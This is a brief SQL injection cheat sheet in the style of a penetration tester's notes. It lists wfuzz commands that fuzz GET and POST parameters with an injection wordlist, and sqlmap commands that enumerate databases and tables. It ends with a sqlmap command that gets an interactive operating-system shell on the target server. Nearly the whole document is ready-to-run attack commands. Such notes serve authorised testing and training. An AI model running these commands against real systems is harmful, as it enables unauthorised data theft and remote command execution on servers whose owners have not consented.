# **SQL Injection**

#### **Fuzzing**

- GET
```
wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -u "http://example.com/index.php?id=FUZZ"
```
- POST
```
wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -d "db=mysql&id=FUZZ" -u "http://example.com"
```     

#### **SQLmap**
```
sqlmap -u "http://example.com/blindsqli.php?user=1" -p user

sqlmap -r request.txt --batch --flush-session
sqlmap -r request.txt --dbms= "mssql" --batch 
sqlmap -r request.txt -p <vulnerable_param> --dbms= "mssql" --dbs --batch 
sqlmap -r request.txt --dbms= "mssql" --tables -D <DB_Name> --batch 
```

- Obtain an interactive shell
```
sqlmap -r request.txt -p <vulnerable_param> --os-shell --web-root "/var/www/html/tmp" --batch
```